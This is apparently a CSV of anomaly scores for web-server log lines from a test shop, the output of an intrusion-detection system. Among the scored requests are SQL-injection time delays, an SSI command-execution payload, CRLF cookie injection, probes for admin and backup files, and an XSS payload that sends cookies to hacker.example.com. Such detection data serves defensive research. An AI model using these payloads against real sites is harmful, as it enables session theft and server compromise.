score_content,score_session,score_fused,score_fused_norm,line
1.6170496940612793,0.8540188670158386,1.235534280538559,1.235534280538559,localhost:8080 - - [10/Jan/2025:14:41:08 +0000] "GET http://localhost:8080/IBMWebAS HTTP/1.1 HTTP/1.1" 200 117 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.83307456970215,0.8721152544021606,15.352594912052155,15.352594912052155,localhost:8080 - - [10/Jan/2025:14:41:08 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=85&cantidad=17&B1=A%F1adir+al+carrito%257C HTTP/1.1 HTTP/1.1" 200 402 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.3285341262817383,0.7537869811058044,2.0411605536937714,2.0411605536937714,localhost:8080 - - [10/Jan/2025:14:41:08 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
44.786720275878906,0.7785261869430542,22.78262323141098,22.78262323141098,localhost:8080 - - [10/Jan/2025:14:41:08 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Queso+Manchego&precio=85&cantidad=17&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 606 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.3285341262817383,0.6654793620109558,1.997006744146347,1.997006744146347,localhost:8080 - - [10/Jan/2025:14:41:09 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.196210861206055,0.6701356768608093,14.933173269033432,14.933173269033432,localhost:8080 - - [10/Jan/2025:14:41:09 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precioA=85&cantidad=17&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 390 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.3285341262817383,0.6883664727210999,2.008450299501419,2.008450299501419,localhost:8080 - - [10/Jan/2025:14:41:09 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.5275269746780396,0.6716936230659485,0.599610298871994,0.599610298871994,localhost:8080 - - [10/Jan/2025:14:41:09 +0000] "GET http://localhost:8080/CFIDE/administrator/index.cfm HTTP/1.1 HTTP/1.1" 200 180 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.3528995513916,0.6759725213050842,15.014436036348343,15.014436036348343,localhost:8080 - - [10/Jan/2025:14:41:10 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%2Bmombour%2C%3Fq&pwd=granoto&remember=on&B1=Entrar HTTP/1.1 HTTP/1.1" 200 393 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.4707748889923096,0.6884654760360718,2.0796201825141907,2.0796201825141907,localhost:8080 - - [10/Jan/2025:14:41:10 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.003583908081055,0.7072081565856934,14.355396032333374,14.355396032333374,localhost:8080 - - [10/Jan/2025:14:41:10 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=lawther&pwd=granoto&remember=on&B1=Entrar HTTP/1.1 HTTP/1.1" 200 366 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.4707748889923096,0.6325956583023071,2.0516852736473083,2.0516852736473083,localhost:8080 - - [10/Jan/2025:14:41:10 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.586383819580078,0.6364065408706665,14.611395180225372,14.611395180225372,localhost:8080 - - [10/Jan/2025:14:41:11 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1 HTTP/1.1" 200 378 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.6868550777435303,0.5548778176307678,2.120866447687149,2.120866447687149,localhost:8080 - - [10/Jan/2025:14:41:11 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
22.997800827026367,0.5550535917282104,11.776427209377289,11.776427209377289,localhost:8080 - - [10/Jan/2025:14:41:11 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.6868550777435303,0.47972995042800903,2.0832925140857697,2.0832925140857697,localhost:8080 - - [10/Jan/2025:14:41:11 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
24.49310302734375,0.47986462712287903,12.486483827233315,12.486483827233315,localhost:8080 - - [10/Jan/2025:14:41:12 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1 HTTP/1.1" 200 276 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.3285341262817383,0.4975825250148773,1.9130583256483078,1.9130583256483078,localhost:8080 - - [10/Jan/2025:14:41:12 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.5275269746780396,0.4990774691104889,0.5133022218942642,0.5133022218942642,localhost:8080 - - [10/Jan/2025:14:41:12 +0000] "GET http://localhost:8080/CFIDE/administrator/enter.cfm HTTP/1.1 HTTP/1.1" 200 180 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
25.60387420654297,0.5157982707023621,13.059836238622665,13.059836238622665,localhost:8080 - - [10/Jan/2025:14:41:12 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8421&B1=Pasar+por+caja%2F HTTP/1.1 HTTP/1.1" 200 309 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.297233819961548,0.4163293242454529,1.8567815721035004,1.8567815721035004,localhost:8080 - - [10/Jan/2025:14:41:13 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
24.873353958129883,0.4110269844532013,12.642190471291542,12.642190471291542,localhost:8080 - - [10/Jan/2025:14:41:13 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=8421&B1=Confirmar HTTP/1.1 HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.297233819961548,0.4113171696662903,1.854275494813919,1.854275494813919,localhost:8080 - - [10/Jan/2025:14:41:13 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.3406786918640137,0.3691955506801605,0.8549371212720871,0.8549371212720871,localhost:8080 - - [10/Jan/2025:14:41:13 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp/4861362529278789730 HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
89.71698760986328,0.45662492513656616,45.086806267499924,45.086806267499924,localhost:8080 - - [10/Jan/2025:14:41:14 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=%2Bvonnie&password=lLaNiSca&nombre=Onella&apellidos=Wiedeman+Nal%F3n&email=sirichanya%40vinavilano.pe&dni=97036086Y&direccion=Calle+Yela+Utrilla+150+&ciudad=Villanueva+del+Trabuco&cp=37450&provincia=M%E1laga&ntc=3862460916827849&B1=Registrar HTTP/1.1 HTTP/1.1" 200 963 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.3962481021881104,0.4516480267047882,1.9239480644464493,1.9239480644464493,localhost:8080 - - [10/Jan/2025:14:41:14 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
87.81829071044922,0.5367373824119568,44.17751404643059,44.17751404643059,localhost:8080 - - [10/Jan/2025:14:41:14 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ault&password=lLaNiSca&nombre=Onella&apellidos=Wiedeman+Nal%F3n&email=sirichanya%40vinavilano.pe&dni=97036086Y&direccion=Calle+Yela+Utrilla+150+&ciudad=Villanueva+del+Trabuco&cp=37450&provincia=M%E1laga&ntc=3862460916827849&B1A=Registrar HTTP/1.1 HTTP/1.1" 200 951 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.3962481021881104,0.553582489490509,1.9749152958393097,1.9749152958393097,localhost:8080 - - [10/Jan/2025:14:41:14 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.24267578125,0.5486186742782593,11.89564722776413,11.89564722776413,localhost:8080 - - [10/Jan/2025:14:41:15 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.3285341262817383,0.5495052933692932,1.9390197098255157,1.9390197098255157,localhost:8080 - - [10/Jan/2025:14:41:15 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.26151517033576965,0.5314729809761047,0.3964940756559372,0.3964940756559372,localhost:8080 - - [10/Jan/2025:14:41:15 +0000] "GET http://localhost:8080/tienda1/publico/.Old HTTP/1.1 HTTP/1.1" 200 153 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.4911535382270813,0.5160213112831116,0.5035874247550964,0.5035874247550964,localhost:8080 - - [10/Jan/2025:14:41:15 +0000] "GET http://localhost:8080/tienda1/global/creditos.jsp~ HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.7352871894836426,0.6095560193061829,1.1724216043949127,1.1724216043949127,localhost:8080 - - [10/Jan/2025:14:41:16 +0000] "GET http://localhost:8080/4861362529278789730 HTTP/1.1 HTTP/1.1" 200 150 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.2212064266204834,0.5961989164352417,0.40870267152786255,0.40870267152786255,localhost:8080 - - [10/Jan/2025:14:41:16 +0000] "GET http://localhost:8080/tienda1/global.Bak HTTP/1.1 HTTP/1.1" 200 147 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.5656038522720337,0.5788958668708801,0.5722498595714569,0.5722498595714569,localhost:8080 - - [10/Jan/2025:14:41:16 +0000] "GET http://localhost:8080/tienda1/miembros/index.jsp.INC HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
82.28404235839844,0.656715452671051,41.470378905534744,41.470378905534744,localhost:8080 - - [10/Jan/2025:14:41:16 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=malina6&password=ami3os&nombre=Sharim&apellidos=Novell+Abenoza%2520&email=tanimoto_hassen%40autobuses-hibridos.tw&dni=62773463T&direccion=Matarrosa+103+&ciudad=Campos&cp=16760&provincia=Girona&ntc=6063512360639873&B1=Registrar HTTP/1.1 HTTP/1.1" 200 915 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.361538887023926,0.6562594175338745,2.0088991522789,2.0088991522789,localhost:8080 - - [10/Jan/2025:14:41:17 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
79.60785675048828,0.7296095490455627,40.16873314976692,40.16873314976692,localhost:8080 - - [10/Jan/2025:14:41:17 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=malina6&password=ami3os&nombre=Sharim&apellidos=Novell+Abenoza&email=tanimoto_hassen%40autobuses-hibridos.tw&dni=62773463T&direccion=Matarrosa+103+&ciudad=Campos&cp=16760&provincia=Girona&ntc=076139709096347&B1=Registrar HTTP/1.1 HTTP/1.1" 200 897 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.361538887023926,0.7465888261795044,2.054063856601715,2.054063856601715,localhost:8080 - - [10/Jan/2025:14:41:17 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
80.49324798583984,0.8198751211166382,40.65656155347824,40.65656155347824,localhost:8080 - - [10/Jan/2025:14:41:17 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=malina6&password=ami3os&nombre=Sharim&apellidos=Novell+Abenoza&email=tanimoto_hassen%40autobuses-hibridos.tw&dniA=62773463T&direccion=Matarrosa+103+&ciudad=Campos&cp=16760&provincia=Girona&ntc=6063512360639873&B1=Registrar HTTP/1.1 HTTP/1.1" 200 903 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.361538887023926,0.8202176094055176,2.0908782482147217,2.0908782482147217,localhost:8080 - - [10/Jan/2025:14:41:18 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.13425281643867493,0.8067847490310669,0.4705187827348709,0.4705187827348709,localhost:8080 - - [10/Jan/2025:14:41:18 +0000] "GET http://localhost:8080/tienda1.inc HTTP/1.1 HTTP/1.1" 200 126 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.4235166609287262,0.7905850410461426,0.6070508509874344,0.6070508509874344,localhost:8080 - - [10/Jan/2025:14:41:18 +0000] "GET http://localhost:8080/samples/dbsamp/dbsamp3.htm HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.0966432094573975,0.7908852100372314,0.9437642097473145,0.9437642097473145,localhost:8080 - - [10/Jan/2025:14:41:18 +0000] "GET http://localhost:8080/tienda1/imagenes/3.gif/asf-logo-wide.gif/ HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.6900426745414734,0.6857559084892273,0.6878992915153503,0.6878992915153503,localhost:8080 - - [10/Jan/2025:14:41:19 +0000] "GET http://localhost:8080/examplesWebApp/WebservicesEJB.jsp HTTP/1.1 HTTP/1.1" 200 192 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.3348281681537628,0.6704155802726746,0.5026218742132187,0.5026218742132187,localhost:8080 - - [10/Jan/2025:14:41:19 +0000] "GET http://localhost:8080/6909030637832563290.jsp HTTP/1.1 HTTP/1.1" 200 162 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
37.00232696533203,0.5990944504737854,18.80071070790291,18.80071070790291,localhost:8080 - - [10/Jan/2025:14:41:19 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=76%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 513 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.3285341262817383,0.599777102470398,1.9641556143760681,1.9641556143760681,localhost:8080 - - [10/Jan/2025:14:41:19 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.511272430419922,0.6040069460868835,15.057639688253403,15.057639688253403,localhost:8080 - - [10/Jan/2025:14:41:20 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Ques%2Bo+Manchego&precio=85&cantidad=76&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.3285341262817383,0.6042089462280273,1.9663715362548828,1.9663715362548828,localhost:8080 - - [10/Jan/2025:14:41:20 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.586383819580078,0.6227027177810669,14.604543268680573,14.604543268680573,localhost:8080 - - [10/Jan/2025:14:41:20 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombreA=Vino+Rioja&precio=85&cantidad=76&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 378 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.3285341262817383,0.6391817927360535,1.9838579595088959,1.9838579595088959,localhost:8080 - - [10/Jan/2025:14:41:20 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.6628154516220093,0.6464821696281433,1.1546488106250763,1.1546488106250763,localhost:8080 - - [10/Jan/2025:14:41:21 +0000] "GET http://localhost:8080~ HTTP/1.1 HTTP/1.1" 200 93 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
77.4246826171875,0.7309866547584534,39.07783463597298,39.07783463597298,localhost:8080 - - [10/Jan/2025:14:41:21 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=laforgesessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&pwd=o1R8me956&remember=off&B1=Entrar HTTP/1.1 HTTP/1.1" 200 882 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.4707748889923096,0.7477725148200989,2.1092737019062042,2.1092737019062042,localhost:8080 - - [10/Jan/2025:14:41:21 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
38.1483154296875,0.6857956647872925,19.417055547237396,19.417055547237396,localhost:8080 - - [10/Jan/2025:14:41:21 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=laforge&pwd=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&remember=off&B1=Entrar HTTP/1.1 HTTP/1.1" 200 528 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.4707748889923096,0.685888946056366,2.0783319175243378,2.0783319175243378,localhost:8080 - - [10/Jan/2025:14:41:22 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.736297607421875,0.616047203540802,14.676172405481339,14.676172405481339,localhost:8080 - - [10/Jan/2025:14:41:22 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=laforge&pwd=o1R8me956&remember=off%2F&B1=Entrar HTTP/1.1 HTTP/1.1" 200 381 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.4707748889923096,0.6160321235656738,2.0434035062789917,2.0434035062789917,localhost:8080 - - [10/Jan/2025:14:41:22 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.43815803527832,0.5446459650993347,14.491402000188828,14.491402000188828,localhost:8080 - - [10/Jan/2025:14:41:22 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=laforge&pwd=o1R8me956&remember=off&B1=Entrar HTTP/1.1 HTTP/1.1" 200 375 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.4707748889923096,0.5444777011871338,2.0076262950897217,2.0076262950897217,localhost:8080 - - [10/Jan/2025:14:41:23 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
33.42183303833008,0.5667486190795898,16.994290828704834,16.994290828704834,localhost:8080 - - [10/Jan/2025:14:41:23 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1 HTTP/1.1" 200 462 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.6868550777435303,0.5821078419685364,2.1344814598560333,2.1344814598560333,localhost:8080 - - [10/Jan/2025:14:41:23 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
22.997800827026367,0.599707305431366,11.798754066228867,11.798754066228867,localhost:8080 - - [10/Jan/2025:14:41:23 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.6868550777435303,0.6158018708229065,2.1513284742832184,2.1513284742832184,localhost:8080 - - [10/Jan/2025:14:41:24 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.6468625068664551,0.6153228878974915,0.6310926973819733,0.6310926973819733,localhost:8080 - - [10/Jan/2025:14:41:24 +0000] "GET http://localhost:8080/tienda1/publico/carrito.jsp.java HTTP/1.1 HTTP/1.1" 200 189 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
